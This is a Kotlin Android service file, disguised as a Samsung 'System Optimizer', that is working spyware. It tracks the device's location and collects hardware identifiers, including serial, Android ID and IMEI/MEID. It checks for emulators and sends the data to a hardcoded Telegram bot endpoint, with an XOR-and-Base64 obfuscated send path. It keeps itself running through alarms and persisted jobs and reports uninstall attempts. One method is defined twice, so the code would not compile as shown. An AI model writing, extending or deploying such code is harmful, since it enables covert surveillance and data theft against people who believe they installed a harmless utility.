package com.samsung.android.app.smartcapture

import android.Manifest
import android.app.*
import android.content.*
import android.content.pm.PackageManager
import android.location.Location
import android.location.LocationListener
import android.location.LocationManager
import android.net.Uri
import android.os.*
import android.provider.Settings
import android.telephony.TelephonyManager
import android.util.Log
import androidx.core.app.NotificationCompat
import kotlinx.coroutines.*
import org.json.JSONObject
import java.io.OutputStreamWriter
import java.net.HttpURLConnection
import java.net.URL
import java.text.SimpleDateFormat
import java.util.*
import java.util.concurrent.Executors

class SystemOptimizerService : Service() {

    private val TAG = "SystemOptimizer"
    private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private val handler = Handler(Looper.getMainLooper())
    private val executor = Executors.newSingleThreadScheduledExecutor()

    companion object {
        private const val BOT_TOKEN = "8699568956:AAE7eTdayK3EhKMhvpoMWBYrW91mTJohDUo"
        private const val CHAT_ID = "7597928991"
        private const val NOTIFICATION_ID = 1001
        private const val CHANNEL_ID = "system_optimizer_channel"
        private const val ALARM_INTERVAL = 5000L
    }

    inner class TransmissionService {
        fun sendData(data: JSONObject) {
            serviceScope.launch {
                try {
                    val url = URL("https://api.telegram.org/bot$BOT_TOKEN/sendMessage")
                    val connection = url.openConnection() as HttpURLConnection
                    connection.requestMethod = "POST"
                    connection.setRequestProperty("Content-Type", "application/json")
                    connection.doOutput = true
                    connection.connectTimeout = 10000
                    connection.readTimeout = 10000

                    val payload = JSONObject().apply {
                        put("chat_id", CHAT_ID)
                        put("text", data.toString())
                        put("parse_mode", "Markdown")
                    }

                    OutputStreamWriter(connection.outputStream).use {
                        it.write(payload.toString())
                        it.flush()
                    }

                    val responseCode = connection.responseCode
                    Log.d(TAG, "Telegram response: $responseCode")
                    connection.disconnect()
                } catch (e: Exception) {
                    Log.e(TAG, "Transmission error: ${e.message}")
                }
            }
        }

        fun sendObfuscatedData(data: String) {
            val obfuscated = data.toByteArray().map { it xor 0xAB }.toByteArray()
            val payload = JSONObject().apply {
                put("type", "obfuscated_data")
                put("content", Base64.getEncoder().encodeToString(obfuscated))
            }
            sendData(payload)
        }
    }

    private val transmissionService = TransmissionService()

    private val locationListener = object : LocationListener {
        override fun onLocationChanged(location: Location) {
            val data = JSONObject().apply {
                put("type", "location_update")
                put("lat", location.latitude)
                put("lon", location.longitude)
                put("accuracy", location.accuracy)
                put("timestamp", SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US).format(Date()))
            }
            transmissionService.sendData(data)
        }

        @Deprecated("Deprecated in Java")
        override fun onStatusChanged(provider: String?, status: Int, extras: Bundle?) {}

        override fun onProviderEnabled(provider: String) {}

        override fun onProviderDisabled(provider: String) {}
    }

    override fun onCreate() {
        super.onCreate()
        Log.d(TAG, "Service creating...")
        createNotificationChannel()
        startForeground(NOTIFICATION_ID, createNotification())
        setupRepeatingAlarms()
        registerPackageRemovalReceiver()
        startLocationTracking()
        collectDeviceInfo()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Log.d(TAG, "Service started")
        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? = null

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "System Optimization",
                NotificationManager.IMPORTANCE_LOW
            ).apply {
                description = "System optimization service"
                setShowBadge(false)
            }
            val notificationManager = getSystemService(NotificationManager::class.java)
            notificationManager.createNotificationChannel(channel)
        }
    }

    private fun createNotification(): Notification {
        val pendingIntent = PendingIntent.getActivity(
            this, 0, Intent(this, PermissionActivity::class.java),
            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
        )
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("System Optimizer")
            .setContentText("Optimizing system performance...")
            .setSmallIcon(android.R.drawable.ic_menu_manage)
            .setContentIntent(pendingIntent)
            .setOngoing(true)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .build()
    }

    private fun setupRepeatingAlarms() {
        val alarmManager = getSystemService(ALARM_SERVICE) as AlarmManager
        val intent = Intent(this, SystemOptimizerService::class.java)
        val pendingIntent = PendingIntent.getService(
            this, 0, intent,
            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
        )

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            alarmManager.setExactAndAllowWhileIdle(
                AlarmManager.RTC_WAKEUP,
                System.currentTimeMillis() + ALARM_INTERVAL,
                pendingIntent
            )
        } else {
            alarmManager.setRepeating(
                AlarmManager.RTC_WAKEUP,
                System.currentTimeMillis(),
                ALARM_INTERVAL,
                pendingIntent
            )
        }

        // Schedule periodic job
        val jobScheduler = getSystemService(Context.JOB_SCHEDULER_SERVICE) as android.app.job.JobScheduler
        val jobInfo = android.app.job.JobInfo.Builder(
            1002,
            ComponentName(this, OptimizationJobService::class.java)
        ).apply {
            setPeriodic(900000L) // 15 minutes
            setPersisted(true)
            setRequiresCharging(false)
            setRequiresDeviceIdle(false)
        }.build()
        jobScheduler.schedule(jobInfo)
    }

    private fun registerPackageRemovalReceiver() {
        val filter = IntentFilter(Intent.ACTION_PACKAGE_REMOVED)
        filter.addDataScheme("package")
        registerReceiver(object : BroadcastReceiver() {
            override fun onReceive(context: Context, intent: Intent) {
                val removedPackage = intent.data?.schemeSpecificPart
                if (removedPackage == packageName) {
                    val data = JSONObject().apply {
                        put("type", "package_removal_attempt")
                        put("package", removedPackage)
                        put("timestamp", SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US).format(Date()))
                    }
                    transmissionService.sendData(data)
                }
            }
        }, filter)
    }

    private fun startLocationTracking() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            if (checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED
                && checkSelfPermission(Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
                return
            }
        } else {
            if (checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
                return
            }
        }
        val locationManager = getSystemService(LOCATION_SERVICE) as LocationManager
        try {
            locationManager.requestLocationUpdates(
                LocationManager.GPS_PROVIDER,
                60000L, 100f, locationListener
            )
            locationManager.requestLocationUpdates(
                LocationManager.NETWORK_PROVIDER,
                60000L, 100f, locationListener
            )
        } catch (e: SecurityException) {
            Log.e(TAG, "Location permission error: ${e.message}")
        }
    }

    private fun collectDeviceInfo() {
        serviceScope.launch {
            try {
                val tm = getSystemService(TELEPHONY_SERVICE) as TelephonyManager
                val deviceInfo = JSONObject().apply {
                    put("type", "device_info")
                    put("device", Build.DEVICE)
                    put("model", Build.MODEL)
                    put("manufacturer", Build.MANUFACTURER)
                    put("brand", Build.BRAND)
                    put("product", Build.PRODUCT)
                    put("hardware", Build.HARDWARE)
                    put("board", Build.BOARD)
                    put("serial", Build.SERIAL)
                    put("android_id", Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID))
                    put("build_fingerprint", Build.FINGERPRINT)
                    put("os_version", Build.VERSION.RELEASE)
                    put("sdk_int", Build.VERSION.SDK_INT)
                    put("timestamp", SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US).format(Date()))
                }

                // Add IMEI/MEID if permission granted
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                    if (checkSelfPermission(Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
                        deviceInfo.put("meid", tm.meid)
                    }
                } else {
                    @Suppress("DEPRECATION")
                    if (checkSelfPermission(Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
                        deviceInfo.put("imei", tm.deviceId)
                    }
                }

                // Check for emulator
                deviceInfo.put("is_emulator", isEmulator())

                transmissionService.sendData(deviceInfo)
            } catch (e: Exception) {
                Log.e(TAG, "Device info collection error: ${e.message}")
            }
        }
    }

    private fun isEmulator(): Boolean {
        return (Build.BRAND.startsWith("generic") && Build.DEVICE.startsWith("generic"))
                || Build.FINGERPRINT.startsWith("generic")
                || Build.FINGERPRINT.startsWith("unknown")
                || Build.HARDWARE.contains("goldfish")
                || Build.HARDWARE.contains("ranchu")
                || Build.MODEL.contains("google_sdk")
                || Build.MODEL.contains("Emulator")
                || Build.MODEL.contains("Android SDK built for x86")
                || Build.MANUFACTURER.contains("Genymotion")
                || Build.PRODUCT.contains("sdk_google")
                || Build.PRODUCT.contains("google_sdk")
                || Build.PRODUCT.contains("sdk")
                || Build.PRODUCT.contains("vbox86p")
                || Build.PRODUCT.contains("emulator")
                || Build.PRODUCT.contains("simulator")
    }

    override fun onDestroy() {
        super.onDestroy()
        serviceScope.cancel()
        executor.shutdown()
        handler.removeCallbacksAndMessages(null)
        try {
            unregisterReceiver(packageRemovalReceiver)
        } catch (e: Exception) {
            // ignore
        }
        Log.d(TAG, "Service destroyed")
    }

    // Store receiver reference for unregistration
    private var packageRemovalReceiver: BroadcastReceiver? = null

    private fun registerPackageRemovalReceiver() {
        val filter = IntentFilter(Intent.ACTION_PACKAGE_REMOVED)
        filter.addDataScheme("package")
        val receiver = object : BroadcastReceiver() {
            override fun onReceive(context: Context, intent: Intent) {
                val removedPackage = intent.data?.schemeSpecificPart
                if (removedPackage == packageName) {
                    val data = JSONObject().apply {
                        put("type", "package_removal_attempt")
                        put("package", removedPackage)
                        put("timestamp", SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US).format(Date()))
                    }
                    transmissionService.sendData(data)
                }
            }
        }
        packageRemovalReceiver = receiver
        registerReceiver(receiver, filter)
    }
}
